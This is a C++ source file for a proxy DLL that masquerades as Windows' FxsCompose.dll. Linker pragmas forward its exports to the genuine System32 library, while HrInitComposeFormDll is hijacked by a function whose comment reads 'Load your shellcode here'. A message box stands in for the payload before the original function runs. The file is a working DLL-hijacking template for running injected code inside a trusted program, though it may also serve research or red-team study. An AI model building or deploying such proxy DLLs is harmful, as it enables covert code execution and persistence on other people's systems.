// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"


#pragma comment(linker,"/export:DllMain=C:\\WINDOWS\\SYSTEM32\\FxsCompose.DllMain,@15")
#pragma comment(linker,"/export:FaxComposeFreeBuffer=C:\\WINDOWS\\SYSTEM32\\FxsCompose.FaxComposeFreeBuffer,@1")
#pragma comment(linker,"/export:HrAddressBookPreTranslateAccelerator=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrAddressBookPreTranslateAccelerator,@2")
#pragma comment(linker,"/export:HrDeInitAddressBook=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrDeInitAddressBook,@3")
#pragma comment(linker,"/export:HrDeinitComposeFormDll=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrDeinitComposeFormDll,@4")
#pragma comment(linker,"/export:HrFaxComposePreTranslateAccelerator=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrFaxComposePreTranslateAccelerator,@5")
#pragma comment(linker,"/export:HrFreeDraftsListViewInfo=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrFreeDraftsListViewInfo,@6")
#pragma comment(linker,"/export:HrGetDraftsListViewInfo=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrGetDraftsListViewInfo,@7")
#pragma comment(linker,"/export:HrInitAddressBook=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrInitAddressBook,@8")
//#pragma comment(linker,"/export:HrInitComposeFormDll=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrInitComposeFormDll,@9")
#pragma comment(linker,"/export:HrInvokeAddressBook=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrInvokeAddressBook,@10")
#pragma comment(linker,"/export:HrNewFaxComposeUI=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrNewFaxComposeUI,@11")
#pragma comment(linker,"/export:HrNewFaxComposeUIFromFile=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrNewFaxComposeUIFromFile,@12")
#pragma comment(linker,"/export:HrNewTiffViewUIFromFile=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrNewTiffViewUIFromFile,@13")
#pragma comment(linker,"/export:HrSelectEmailRecipient=C:\\WINDOWS\\SYSTEM32\\FxsCompose.HrSelectEmailRecipient,@14")

typedef DWORD(*HrInitComposeFormDll_Type)(void);

DWORD ProxyFunction(void) {

    //Load your shellcode here.. I'm going to load MessageBox 
    MessageBox(NULL, L"Shellcode Loaded", L"Shellcode Loaded", MB_OK);

    // Load original DLL and get function pointer
    HMODULE hModule = LoadLibrary(L"C:\\Windows\\System32\\FxsCompose.dll");
    HrInitComposeFormDll_Type Original_HrInitComposeFormDll = (HrInitComposeFormDll_Type)GetProcAddress(hModule, "HrInitComposeFormDll");

    // Call original function
    DWORD result = Original_HrInitComposeFormDll();

    return result;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

